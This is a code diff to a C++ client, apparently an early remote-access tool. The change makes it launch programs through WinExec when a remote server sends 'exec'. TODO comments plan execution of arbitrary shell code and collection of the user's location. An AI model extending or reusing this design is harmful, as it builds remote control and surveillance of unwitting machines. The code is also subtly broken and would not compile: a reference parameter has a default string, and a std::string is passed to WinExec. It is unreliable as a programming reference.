@@ -172,6 +172,10 @@ void Client::run(const std::string& host, const std::string& port)
         try {
             std::string command = receiveData();
             //sendData(command);
+			if (command == "exec")
+			{
+				execute();
+			}
             std::cout << "Server command: " << command << std::endl;
             
         } catch (const std::exception& e) {
@@ -181,12 +185,22 @@ void Client::run(const std::string& host, const std::string& port)
     }
     
     std::cout << "Disconnected from server" << std::endl;
-} 
+}
+
+// void Client::executeShellCode()
+// void Client::executeShellCode()
+// TODO: make this function polymorphic (meaning it can execute shell code, exe, or other stuff)
+void Client::execute(std::string& filename="notepad.exe")
+{
+	WinExec(filename, SW_SHOW);
+}
 
 // void Client::getInfo() ? 
 void Client::getSystemInfo()
 {
 }
+
+// TODO: get locatoin of pc/person
 
 /*
 // TODO: also maybe check if these processes are even installed
